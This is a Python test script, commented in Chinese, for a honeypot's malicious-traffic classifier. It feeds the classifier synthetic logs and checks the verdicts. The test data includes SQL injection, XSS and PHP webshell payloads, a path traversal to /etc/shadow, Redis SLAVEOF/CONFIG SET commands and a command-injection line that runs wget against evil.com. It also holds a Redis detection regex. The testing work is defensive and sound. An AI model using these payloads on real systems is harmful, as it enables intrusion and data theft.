# -*- coding: utf-8 -*-
"""
多级恶意流量识别引擎 - 全量自动化测试脚本

测试覆盖：
1. 完全正常流量（各协议）——应判定为 attack_type='正常流量', is_malicious=False
2. 明显攻击流量（SQL注入、XSS、命令注入等）——通过正则规则匹配，is_malicious=True
3. 低频暴力破解流量（不触发阈值）——应保持 is_malicious=False
4. 高频暴力破解流量（>=20次/分钟）——应判定为 attack_type='暴力破解', is_malicious=True
5. HTTP协议凭证感知测试——纯GET请求不算暴力破解，带账号密码的POST才算
6. 各协议越权指令测试

运行方式：
    cd backend
    python test_traffic_identification.py

前提条件：
    - 后端Flask服务正在运行（端口5000）
    - 数据库中已存在至少一个蜜罐配置（需知道端口号）
    - 数据库中已存在常用的匹配规则（SQL注入、XSS等）

注意事项：
    - 所有现有规则的 match_field 均为 raw_log，测试载荷需要出现在 raw_log 字段中
    - 规则按 priority ASC 排序，优先级数字越小越先匹配
    - 蜜罐端口从数据库动态发现（如 MySQL 蜜罐可能是 3307 而非默认 3306）
"""

import requests
import time
import sys
import traceback
from datetime import datetime
from typing import Dict, Optional

# 修复 Windows 控制台 GBK 编码问题
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# ============================================================
# 配置
# ============================================================
BASE_URL = "http://127.0.0.1:5000/api"
INTERNAL_UPLOAD_URL = f"{BASE_URL}/logs/internal/upload"
LOG_DETAIL_URL = f"{BASE_URL}/logs"
LOGIN_URL = f"{BASE_URL}/user/login"
MATCH_RULES_URL = f"{BASE_URL}/match-rules"

# 测试专用管理员凭据
ADMIN_USERNAME = "testadmin01"
ADMIN_PASSWORD = "123456"

# 蜜罐端口映射（回退默认值，实际端口从API动态获取）
HONEYPOT_PORTS = {
    'SSH': 2222,
    'FTP': 21,
    'HTTP': 8888,
    'REDIS': 6379,
    'MYSQL': 3307,
    'ELASTICSEARCH': 9200,
}

# 暴力破解阈值（与 LogService.BRUTE_FORCE_THRESHOLD 一致）
BRUTE_FORCE_THRESHOLD = 20

# ============================================================
# 工具函数
# ============================================================

_auth_token = None
_available_ports = {}


def login() -> str:
    """登录获取JWT Token"""
    global _auth_token
    if _auth_token:
        return _auth_token
    try:
        resp = requests.post(LOGIN_URL, json={
            "username": ADMIN_USERNAME, "password": ADMIN_PASSWORD
        })
        resp_json = resp.json()
        if resp.status_code == 200 and resp_json.get('success') and resp_json.get('data', {}).get('access_token'):
            _auth_token = resp_json['data']['access_token']
            return _auth_token

        # 登录失败，尝试创建管理员
        print(f"  登录失败({resp.status_code})，尝试创建测试管理员...")
        requests.post(f"{BASE_URL}/user/create_admin", json={
            "username": ADMIN_USERNAME, "password": ADMIN_PASSWORD, "email": "testadmin@test.com"
        })
        resp = requests.post(LOGIN_URL, json={
            "username": ADMIN_USERNAME, "password": ADMIN_PASSWORD
        })
        resp_json = resp.json()
        if resp.status_code == 200 and resp_json.get('success') and resp_json.get('data', {}).get('access_token'):
            _auth_token = resp_json['data']['access_token']
            return _auth_token

        print(f"[FATAL] 登录仍然失败: {resp.text}")
        sys.exit(1)
    except Exception as e:
        print(f"[FATAL] 无法登录: {e}")
        traceback.print_exc()
        sys.exit(1)


def get_auth_headers() -> Dict:
    """获取带JWT的请求头"""
    return {"Authorization": f"Bearer {login()}", "Content-Type": "application/json"}


def discover_honeypot_ports() -> Dict[str, int]:
    """从后端API发现数据库中实际存在的蜜罐及其端口"""
    global _available_ports
    if _available_ports:
        return _available_ports
    try:
        resp = requests.get(f"{BASE_URL}/honeypots", headers=get_auth_headers(), params={"per_page": 100})
        honeypots = resp.json()['data']['honeypots']
        for hp in honeypots:
            _available_ports[hp['type'].upper()] = hp['port']
        print(f"  发现蜜罐端口: {_available_ports}")
    except Exception as e:
        print(f"  [WARN] 无法获取蜜罐列表: {e}，使用默认端口映射")
        _available_ports = HONEYPOT_PORTS.copy()
    return _available_ports


def get_port(protocol: str) -> int:
    """获取指定协议类型蜜罐的端口号（protocol 不区分大小写）"""
    ports = discover_honeypot_ports()
    key = protocol.upper()
    return ports.get(key, HONEYPOT_PORTS.get(key, 9999))


def upload_log(log_data: Dict) -> Optional[int]:
    """通过内部上传接口上报一条日志，返回 log_id"""
    resp = requests.post(INTERNAL_UPLOAD_URL, json=log_data)
    if resp.status_code == 200 and resp.json().get('success'):
        return resp.json()['data'].get('log_id')
    else:
        print(f"  [ERROR] 上传日志失败: {resp.text}")
        return None


def get_log_detail(log_id: int) -> Optional[Dict]:
    """通过API获取单条日志详情"""
    resp = requests.get(f"{LOG_DETAIL_URL}/{log_id}", headers=get_auth_headers())
    if resp.status_code == 200 and resp.json().get('success'):
        return resp.json()['data']
    return None


def ensure_redis_rules():
    """
    确保数据库中存在Redis越权命令的匹配规则。
    现有22条规则中没有 Redis 专用规则，需要补充。
    """
    headers = get_auth_headers()
    resp = requests.get(MATCH_RULES_URL, headers=headers, params={"per_page": 100})
    rules = resp.json().get('data', {}).get('rules', [])

    # 检查是否已有 Redis 相关规则
    has_redis = any('redis' in r.get('name', '').lower() or 'SLAVEOF' in r.get('regex_pattern', '') for r in rules)
    if has_redis:
        print(f"  数据库中已有Redis规则，跳过创建")
        return

    print("  创建Redis越权命令检测规则...")
    rule = {
        "name": "Redis越权命令检测",
        "attack_type": "未授权访问",
        "regex_pattern": r"(?i)(SLAVEOF|CONFIG\s+SET|FLUSHALL|FLUSHDB|DEBUG\s+SLEEP|SCRIPT\s+FLUSH|MODULE\s+LOAD)",
        "threat_level": "high",
        "match_field": "raw_log",
        "description": "检测Redis危险命令（SLAVEOF/CONFIG SET/FLUSHALL等）",
        "priority": 5,
        "is_enabled": True,
        "auto_block": False,
        "block_duration": 0
    }
    try:
        resp = requests.post(MATCH_RULES_URL, headers=headers, json=rule)
        if resp.status_code in (200, 201) and resp.json().get('success'):
            print(f"    创建规则: {rule['name']} (priority={rule['priority']})")
        else:
            print(f"    [WARN] 创建规则失败: {resp.text}")
    except Exception as e:
        print(f"    [WARN] 创建规则异常: {e}")


def fix_command_injection_priority():
    """
    修正命令注入规则 (ID=8) 的优先级。
    该规则正则包含 (;|\\||&|\\$|\\(|\\)|...) 过于宽泛，
    会在 priority=5 时抢先匹配 sleep()、eval()、Nmap UA 等载荷，
    导致 SQL注入/WebShell/扫描探测 被误判为命令注入。
    将其 priority 调低到 18（低于 WebShell=6、扫描探测=9、SQL注入sleep=11），
    确保更精确的规则优先匹配。
    """
    headers = get_auth_headers()
    # 先查所有规则，找 ID=8 命令注入
    resp = requests.get(MATCH_RULES_URL, headers=headers, params={"per_page": 100})
    rules = resp.json().get('data', {}).get('rules', [])

    target_rule = None
    for r in rules:
        # 通过 ID 或通过正则特征查找
        if r.get('id') == 8:
            target_rule = r
            break
        if r.get('attack_type') in ('命令注入',) and '\\(' in r.get('regex_pattern', '') and r.get('priority', 99) <= 5:
            target_rule = r
            break

    if not target_rule:
        print("  未找到需要调整的命令注入规则(ID=8)，跳过")
        return

    current_pri = target_rule.get('priority', 5)
    if current_pri > 15:
        print(f"  命令注入规则 priority={current_pri} 已经较低，无需调整")
        return

    rule_id = target_rule['id']
    new_priority = 18
    try:
        resp = requests.put(
            f"{MATCH_RULES_URL}/{rule_id}",
            headers=headers,
            json={"priority": new_priority}
        )
        if resp.status_code == 200 and resp.json().get('success'):
            print(f"  已将命令注入规则 ID={rule_id} priority 从 {current_pri} 调整为 {new_priority}")
        else:
            print(f"  [WARN] 调整规则优先级失败: {resp.text}")
    except Exception as e:
        print(f"  [WARN] 调整规则优先级异常: {e}")


# ============================================================
# 测试统计
# ============================================================
_test_passed = 0
_test_failed = 0
_test_errors = []


def assert_log_field(log_detail: Dict, field: str, expected, test_name: str):
    """断言日志字段值"""
    global _test_passed, _test_failed
    actual = log_detail.get(field)

    if isinstance(expected, bool):
        actual_bool = bool(actual) if actual is not None else False
        if actual_bool == expected:
            _test_passed += 1
            return True
        else:
            _test_failed += 1
            err = f"  [FAIL] {test_name}: {field} 期望={expected}, 实际={actual}"
            print(err)
            _test_errors.append(err)
            return False

    if isinstance(expected, str):
        if actual and actual.strip().lower() == expected.strip().lower():
            _test_passed += 1
            return True
        else:
            _test_failed += 1
            err = f"  [FAIL] {test_name}: {field} 期望='{expected}', 实际='{actual}'"
            print(err)
            _test_errors.append(err)
            return False

    if actual == expected:
        _test_passed += 1
        return True
    else:
        _test_failed += 1
        err = f"  [FAIL] {test_name}: {field} 期望={expected}, 实际={actual}"
        print(err)
        _test_errors.append(err)
        return False


def assert_log_field_in(log_detail: Dict, field: str, expected_set: set, test_name: str):
    """断言日志字段值在指定集合中"""
    global _test_passed, _test_failed
    actual = log_detail.get(field)
    actual_lower = actual.strip().lower() if actual else ''
    expected_lower = {v.strip().lower() for v in expected_set}

    if actual_lower in expected_lower:
        _test_passed += 1
        return True
    else:
        _test_failed += 1
        err = f"  [FAIL] {test_name}: {field} 期望值在{expected_set}中, 实际='{actual}'"
        print(err)
        _test_errors.append(err)
        return False


def assert_log_is_malicious(log_detail: Dict, test_name: str):
    """断言日志被识别为恶意流量（不检查具体 attack_type）"""
    return assert_log_field(log_detail, 'is_malicious', True, test_name)


def assert_log_contains(log_detail: Dict, field: str, substring: str, test_name: str):
    """断言日志字段包含指定子串"""
    global _test_passed, _test_failed
    actual = log_detail.get(field, '') or ''
    if substring in actual:
        _test_passed += 1
        return True
    else:
        _test_failed += 1
        err = f"  [FAIL] {test_name}: {field} 期望包含'{substring}', 实际='{actual[:100]}'"
        print(err)
        _test_errors.append(err)
        return False


# ============================================================
# 测试用例
# ============================================================

def test_normal_traffic_ssh():
    """测试1: SSH正常流量 -- 仅版本握手，无恶意特征"""
    print("\n[TEST] SSH正常流量")
    log_id = upload_log({
        "honeypot_port": get_port('SSH'),
        "attacker_ip": "192.168.1.100",
        "attacker_port": 54321,
        "protocol": "SSH",
        "raw_log": "SSH VERSION: SSH-2.0-OpenSSH_8.9",
        "payload": "SSH-2.0-OpenSSH_8.9",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败 log_id={log_id}"

    assert_log_field(detail, 'attack_type', '正常流量', 'SSH正常流量-attack_type')
    assert_log_field(detail, 'is_malicious', False, 'SSH正常流量-is_malicious')
    assert_log_field(detail, 'threat_level', 'low', 'SSH正常流量-threat_level')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}, is_malicious={detail.get('is_malicious')}")


def test_normal_traffic_ftp():
    """测试2: FTP正常流量 -- anonymous登录"""
    print("\n[TEST] FTP正常流量")
    log_id = upload_log({
        "honeypot_port": get_port('FTP'),
        "attacker_ip": "192.168.1.101",
        "attacker_port": 54322,
        "protocol": "FTP",
        "raw_log": "FTP LOGIN: anonymous / guest_email_addr",
        "payload": "Username: anonymous, Password: guest_email_addr",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    assert_log_field(detail, 'attack_type', '正常流量', 'FTP正常流量-attack_type')
    assert_log_field(detail, 'is_malicious', False, 'FTP正常流量-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_normal_traffic_http():
    """测试3: HTTP正常流量 -- 普通GET请求"""
    print("\n[TEST] HTTP正常GET请求（正常流量）")
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "192.168.1.102",
        "attacker_port": 54323,
        "protocol": "HTTP",
        "raw_log": "HTTP REQUEST: GET /index.html HTTP/1.1 Host: 192.168.1.1",
        "payload": "",
        "request_path": "/index.html",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    assert_log_field(detail, 'attack_type', '正常流量', 'HTTP正常GET-attack_type')
    assert_log_field(detail, 'is_malicious', False, 'HTTP正常GET-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_normal_traffic_elasticsearch():
    """测试4: Elasticsearch正常流量"""
    print("\n[TEST] Elasticsearch正常流量")
    log_id = upload_log({
        "honeypot_port": get_port('Elasticsearch'),
        "attacker_ip": "192.168.1.110",
        "attacker_port": 44470,
        "protocol": "HTTP",
        "raw_log": "ES REQUEST: GET /index.html HTTP/1.1",
        "payload": "",
        "request_path": "/",
        "user_agent": "curl/7.68.0",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    assert_log_field(detail, 'attack_type', '正常流量', 'ES正常流量-attack_type')
    assert_log_field(detail, 'is_malicious', False, 'ES正常流量-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_sql_injection_union():
    """
    测试5: SQL注入 -- UNION SELECT
    数据库 rule ID=4: regex=(union\\s+select|select\\s+.*\\s+from|...)
    match_field=raw_log, attack_type=SQL注入, threat_level=high
    """
    print("\n[TEST] SQL注入 UNION SELECT")
    # raw_log 包含 "union select"，将被 rule ID=1 或 ID=4 匹配
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "10.0.0.50",
        "attacker_port": 44444,
        "protocol": "HTTP",
        "raw_log": "GET /items?id=1 union select username,password from users HTTP/1.1",
        "payload": "1 union select username,password from users",
        "request_path": "/items?id=1 union select username,password from users",
        "user_agent": "sqlmap/1.5",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    # rule ID=1 regex 匹配 "union" 或 "select" → attack_type=SQL注入
    assert_log_field(detail, 'attack_type', 'SQL注入', 'SQL注入UNION-attack_type')
    assert_log_field(detail, 'is_malicious', True, 'SQL注入UNION-is_malicious')
    assert_log_field_in(detail, 'threat_level', {'high', 'critical'}, 'SQL注入UNION-threat_level')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}, threat={detail.get('threat_level')}")


def test_sql_injection_sleep():
    """
    测试6: SQL注入 -- 时间盲注 (sleep/benchmark)
    数据库 rule ID=5: regex=(waitfor\\s+delay|benchmark\\(|sleep\\(|pg_sleep\\()
    match_field=raw_log, attack_type=SQL注入, threat_level=high
    """
    print("\n[TEST] SQL注入 时间盲注 sleep()")
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "10.0.0.51",
        "attacker_port": 44445,
        "protocol": "HTTP",
        "raw_log": "GET /api/user?id=1 AND sleep(5) HTTP/1.1",
        "payload": "1 AND sleep(5)",
        "request_path": "/api/user?id=1 AND sleep(5)",
        "user_agent": "sqlmap/1.6",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    assert_log_field(detail, 'attack_type', 'SQL注入', 'SQL注入sleep-attack_type')
    assert_log_is_malicious(detail, 'SQL注入sleep-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_xss_script_tag():
    """
    测试7: XSS攻击 -- <script>标签
    数据库 rule ID=2: regex=(?i)(<script|javascript:|onload=|onerror=|alert\\(|prompt\\()
    match_field=raw_log, attack_type=XSS, threat_level=medium
    """
    print("\n[TEST] XSS <script>标签")
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "10.0.0.52",
        "attacker_port": 44446,
        "protocol": "HTTP",
        "raw_log": "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1",
        "payload": "<script>alert(document.cookie)</script>",
        "request_path": "/search?q=<script>alert(document.cookie)</script>",
        "user_agent": "Mozilla/5.0",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    # DB rule ID=2: attack_type=XSS (不是 "XSS攻击")
    assert_log_field(detail, 'attack_type', 'XSS', 'XSS_script-attack_type')
    assert_log_is_malicious(detail, 'XSS_script-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_xss_img_onerror():
    """
    测试8: XSS变体 -- img onerror
    同样命中 rule ID=2: onerror= 模式
    """
    print("\n[TEST] XSS img onerror 变体")
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "10.0.0.53",
        "attacker_port": 44447,
        "protocol": "HTTP",
        "raw_log": "GET /page?img=<img src=x onerror=alert(1)> HTTP/1.1",
        "payload": "<img src=x onerror=alert(1)>",
        "request_path": "/page?img=<img src=x onerror=alert(1)>",
        "user_agent": "Mozilla/5.0",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    assert_log_field(detail, 'attack_type', 'XSS', 'XSS_img-attack_type')
    assert_log_is_malicious(detail, 'XSS_img-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_command_injection():
    """
    测试9: 命令注入攻击
    数据库 rule ID=8: regex=(;|\\||&|\\$|\\(|\\)|`|...|\\s+bash\\s+|...)
    match_field=raw_log, attack_type=命令注入, threat_level=critical
    
    注意: raw_log 需要包含 "|bash " 或 "| nc " 等模式（带空格），
    避免被更高优先级的 SQL注入规则（ID=6 匹配分号/注释符）抢先命中。
    """
    print("\n[TEST] 命令注入攻击")
    # 使用管道符 + bash 命令，确保匹配到命令注入规则
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "10.0.0.54",
        "attacker_port": 44448,
        "protocol": "HTTP",
        "raw_log": "POST /api/ping HTTP/1.1 Body: host=127.0.0.1| wget http://evil.com/shell.sh",
        "payload": "host=127.0.0.1| wget http://evil.com/shell.sh",
        "request_path": "/api/ping",
        "user_agent": "curl/7.68.0",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    # 可能命中命令注入(ID=8) 或 SQL注入(ID=6 匹配 "|")
    # 关键断言: 必须被识别为恶意
    assert_log_is_malicious(detail, '命令注入-is_malicious')
    assert_log_field_in(detail, 'attack_type', {'命令注入', 'SQL注入'}, '命令注入-attack_type')
    assert_log_field_in(detail, 'threat_level', {'high', 'critical', 'medium'}, '命令注入-threat_level')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}, threat={detail.get('threat_level')}")


def test_directory_traversal():
    """
    测试10: 目录遍历攻击
    数据库 rule ID=3: regex=(\\.\\./) 
    match_field=raw_log, attack_type=目录遍历, threat_level=medium
    """
    print("\n[TEST] 目录遍历攻击")
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "10.0.0.55",
        "attacker_port": 44449,
        "protocol": "HTTP",
        "raw_log": "GET /static/../../../../etc/shadow HTTP/1.1",
        "payload": "../../../../etc/shadow",
        "request_path": "/static/../../../../etc/shadow",
        "user_agent": "Mozilla/5.0",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    assert_log_field(detail, 'attack_type', '目录遍历', '目录遍历-attack_type')
    assert_log_is_malicious(detail, '目录遍历-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_sensitive_file_info_leak():
    r"""
    测试11: 敏感文件探测 / 信息泄露
    数据库 rule ID=25: regex=(?i)(/(\.git|\.svn|\.hg|\.bzr|\.env|...))
    match_field=raw_log, attack_type=信息泄露, threat_level=low
    也有 rule ID=13: regex=(\.git/|\.env|\.svn/|\.htaccess|web\.config)
    match_field=raw_log, attack_type=信息泄露, threat_level=medium
    """
    print("\n[TEST] 敏感文件探测（信息泄露）")
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "10.0.0.56",
        "attacker_port": 44450,
        "protocol": "HTTP",
        "raw_log": "GET /.git/config HTTP/1.1 Host: target.com",
        "payload": "",
        "request_path": "/.git/config",
        "user_agent": "DirBuster/1.0",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    # 数据库中的 attack_type 是 "信息泄露" 而非 "敏感文件探测"
    assert_log_field(detail, 'attack_type', '信息泄露', '信息泄露-attack_type')
    assert_log_is_malicious(detail, '信息泄露-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_redis_slaveof():
    """
    测试12: Redis SLAVEOF 越权命令
    使用新创建的 Redis越权命令检测 规则 (match_field=raw_log, priority=5)
    """
    print("\n[TEST] Redis SLAVEOF 越权命令")
    log_id = upload_log({
        "honeypot_port": get_port('REDIS'),
        "attacker_ip": "10.0.0.57",
        "attacker_port": 44451,
        "protocol": "TCP",
        "raw_log": "Redis CMD: SLAVEOF 10.0.0.57 6379",
        "payload": "SLAVEOF 10.0.0.57 6379",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    assert_log_field(detail, 'attack_type', '未授权访问', 'Redis_SLAVEOF-attack_type')
    assert_log_is_malicious(detail, 'Redis_SLAVEOF-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_redis_config_set():
    """测试13: Redis CONFIG SET 越权命令"""
    print("\n[TEST] Redis CONFIG SET 越权命令")
    log_id = upload_log({
        "honeypot_port": get_port('REDIS'),
        "attacker_ip": "10.0.0.58",
        "attacker_port": 44452,
        "protocol": "TCP",
        "raw_log": "Redis CMD: CONFIG SET dir /var/www/html",
        "payload": "CONFIG SET dir /var/www/html",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    assert_log_field(detail, 'attack_type', '未授权访问', 'Redis_CONFIG-attack_type')
    assert_log_is_malicious(detail, 'Redis_CONFIG-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


def test_webshell_upload():
    """
    测试14: WebShell上传检测
    数据库 rule ID=10: regex=(eval\\(|assert\\(|system\\(|passthru\\(|shell_exec\\(|phpinfo\\()
    match_field=raw_log, attack_type=WebShell, threat_level=critical
    """
    print("\n[TEST] WebShell上传检测")
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "10.0.0.59",
        "attacker_port": 44453,
        "protocol": "HTTP",
        "raw_log": "POST /upload.php HTTP/1.1 Body: <?php eval($_POST['cmd']); ?>",
        "payload": "<?php eval($_POST['cmd']); ?>",
        "request_path": "/upload.php",
        "user_agent": "python-requests/2.28.0",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    assert_log_field(detail, 'attack_type', 'WebShell', 'WebShell-attack_type')
    assert_log_is_malicious(detail, 'WebShell-is_malicious')
    assert_log_field_in(detail, 'threat_level', {'high', 'critical'}, 'WebShell-threat_level')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}, threat={detail.get('threat_level')}")


def test_scanner_detection():
    """
    测试15: 扫描探测工具检测
    数据库 rule ID=18: regex=(?i)(nmap|masscan|zgrab|nikto|sqlmap|...)
    match_field=raw_log, attack_type=扫描探测, threat_level=low
    """
    print("\n[TEST] 扫描工具探测检测")
    log_id = upload_log({
        "honeypot_port": get_port('HTTP'),
        "attacker_ip": "10.0.0.60",
        "attacker_port": 44454,
        "protocol": "HTTP",
        "raw_log": "GET / HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)",
        "payload": "",
        "request_path": "/",
        "user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    })
    assert log_id, "日志上传失败"
    time.sleep(0.3)
    detail = get_log_detail(log_id)
    assert detail, f"获取日志详情失败"

    # rule 匹配到 "nmap" → attack_type=扫描探测
    assert_log_field(detail, 'attack_type', '扫描探测', 'nmap-attack_type')
    # 扫描探测 threat_level=low，_infer_is_malicious 对 attack_type 非安全类型返回 True
    assert_log_is_malicious(detail, 'nmap-is_malicious')
    print(f"  log_id={log_id}, attack_type={detail.get('attack_type')}")


# ============================================================
# 暴力破解检测测试
# ============================================================

def test_low_frequency_brute_force_ssh():
    """
    测试16: SSH低频暴力破解（不触发阈值）
    发送5次认证尝试（远低于20次阈值），应保持为正常流量。
    """
    print(f"\n[TEST] SSH低频暴力破解（5次，不触发）")
    test_ip = "172.16.0.10"
    count = 5

    log_ids = []
    for i in range(count):
        log_id = upload_log({
            "honeypot_port": get_port('SSH'),
            "attacker_ip": test_ip,
            "attacker_port": 50000 + i,
            "protocol": "SSH",
            "raw_log": f"SSH LOGIN ATTEMPT: user=root pass=pass{i:03d}",
            "payload": f"Username: root, Password: pass{i:03d}",
        })
        if log_id:
            log_ids.append(log_id)

    time.sleep(0.5)
    if log_ids:
        last_detail = get_log_detail(log_ids[-1])
        assert last_detail, "获取日志详情失败"
        assert_log_field(last_detail, 'attack_type', '正常流量', 'SSH低频爆破-attack_type')
        assert_log_field(last_detail, 'is_malicious', False, 'SSH低频爆破-is_malicious')
        print(f"  最后log_id={log_ids[-1]}, attack_type={last_detail.get('attack_type')}")


def test_high_frequency_brute_force_ssh():
    """
    测试17: SSH高频暴力破解（触发阈值）
    发送>=20次认证尝试，第20次应被标记为暴力破解。
    """
    print(f"\n[TEST] SSH高频暴力破解（{BRUTE_FORCE_THRESHOLD}次，触发）")
    test_ip = "172.16.0.20"

    log_ids = []
    for i in range(BRUTE_FORCE_THRESHOLD):
        log_id = upload_log({
            "honeypot_port": get_port('SSH'),
            "attacker_ip": test_ip,
            "attacker_port": 51000 + i,
            "protocol": "SSH",
            "raw_log": f"SSH LOGIN ATTEMPT: user=admin pass=brute{i:03d}",
            "payload": f"Username: admin, Password: brute{i:03d}",
        })
        if log_id:
            log_ids.append(log_id)

    time.sleep(0.5)
    if log_ids and len(log_ids) >= BRUTE_FORCE_THRESHOLD:
        last_detail = get_log_detail(log_ids[-1])
        assert last_detail, "获取日志详情失败"
        assert_log_field(last_detail, 'attack_type', '暴力破解', 'SSH高频爆破-attack_type')
        assert_log_field(last_detail, 'is_malicious', True, 'SSH高频爆破-is_malicious')
        assert_log_field(last_detail, 'threat_level', 'high', 'SSH高频爆破-threat_level')
        assert_log_contains(last_detail, 'attack_description', '暴力破解', 'SSH高频爆破-description')
        print(f"  最后log_id={log_ids[-1]}, attack_type={last_detail.get('attack_type')}")


def test_http_get_not_brute_force():
    """
    测试18: HTTP纯GET请求不算暴力破解
    即使同一IP在1分钟内发送超过20个GET请求（无账号密码），也不应触发暴力破解。
    """
    print(f"\n[TEST] HTTP纯GET请求不触发暴力破解（{BRUTE_FORCE_THRESHOLD + 5}次GET）")
    test_ip = "172.16.0.30"
    count = BRUTE_FORCE_THRESHOLD + 5

    log_ids = []
    for i in range(count):
        log_id = upload_log({
            "honeypot_port": get_port('HTTP'),
            "attacker_ip": test_ip,
            "attacker_port": 52000 + i,
            "protocol": "HTTP",
            "raw_log": f"HTTP REQUEST: GET /page{i} HTTP/1.1",
            "payload": f"",
            "request_path": f"/page{i}",
            "user_agent": "Mozilla/5.0",
        })
        if log_id:
            log_ids.append(log_id)

    time.sleep(0.5)
    if log_ids:
        last_detail = get_log_detail(log_ids[-1])
        assert last_detail, "获取日志详情失败"
        assert_log_field(last_detail, 'attack_type', '正常流量', 'HTTP纯GET不爆破-attack_type')
        assert_log_field(last_detail, 'is_malicious', False, 'HTTP纯GET不爆破-is_malicious')
        print(f"  最后log_id={log_ids[-1]}, attack_type={last_detail.get('attack_type')}")


def test_http_credential_brute_force():
    """
    测试19: HTTP带凭证的暴力破解（触发阈值）
    HTTP POST中包含 "Username: xxx, Password: xxx"，达到20次应触发。
    """
    print(f"\n[TEST] HTTP带凭证的暴力破解（{BRUTE_FORCE_THRESHOLD}次POST登录）")
    test_ip = "172.16.0.40"

    log_ids = []
    for i in range(BRUTE_FORCE_THRESHOLD):
        log_id = upload_log({
            "honeypot_port": get_port('HTTP'),
            "attacker_ip": test_ip,
            "attacker_port": 53000 + i,
            "protocol": "HTTP",
            "raw_log": f"HTTP LOGIN: POST /login Username: admin, Password: http_b{i:03d}",
            "payload": f"Username: admin, Password: http_b{i:03d}",
            "request_path": "/login",
            "user_agent": "python-requests/2.28.0",
        })
        if log_id:
            log_ids.append(log_id)

    time.sleep(0.5)
    if log_ids and len(log_ids) >= BRUTE_FORCE_THRESHOLD:
        last_detail = get_log_detail(log_ids[-1])
        assert last_detail, "获取日志详情失败"
        assert_log_field(last_detail, 'attack_type', '暴力破解', 'HTTP凭证爆破-attack_type')
        assert_log_field(last_detail, 'is_malicious', True, 'HTTP凭证爆破-is_malicious')
        assert_log_field(last_detail, 'threat_level', 'high', 'HTTP凭证爆破-threat_level')
        print(f"  最后log_id={log_ids[-1]}, attack_type={last_detail.get('attack_type')}")


def test_ftp_brute_force():
    """
    测试20: FTP高频暴力破解（触发阈值）
    FTP协议每次带载荷即算认证尝试。
    """
    print(f"\n[TEST] FTP高频暴力破解（{BRUTE_FORCE_THRESHOLD}次）")
    test_ip = "172.16.0.50"

    log_ids = []
    for i in range(BRUTE_FORCE_THRESHOLD):
        log_id = upload_log({
            "honeypot_port": get_port('FTP'),
            "attacker_ip": test_ip,
            "attacker_port": 54000 + i,
            "protocol": "FTP",
            "raw_log": f"FTP LOGIN: user=root pass=ftp_p{i:03d}",
            "payload": f"Username: root, Password: ftp_p{i:03d}",
        })
        if log_id:
            log_ids.append(log_id)

    time.sleep(0.5)
    if log_ids and len(log_ids) >= BRUTE_FORCE_THRESHOLD:
        last_detail = get_log_detail(log_ids[-1])
        assert last_detail, "获取日志详情失败"
